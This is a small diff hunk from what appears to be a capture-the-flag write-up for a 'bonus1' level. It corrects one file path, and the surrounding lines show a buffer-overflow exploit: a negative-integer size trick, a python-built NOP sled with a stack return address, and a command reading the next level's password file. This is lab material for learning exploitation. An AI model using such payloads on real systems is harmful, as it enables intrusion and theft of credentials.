@@ -29,7 +29,7 @@ so for x = 60 :\
 `nb  = -1073741809`
 
 ```
-$ tmp/a.out
+$ /tmp/a.out
 0xbffff83f
 $ ./bonus1 -1073741809 $(python -c 'print "\x90" * 56 + "\x3f\xf8\xff\xbf"')
 $ cat /home/user/bonus2/.pass
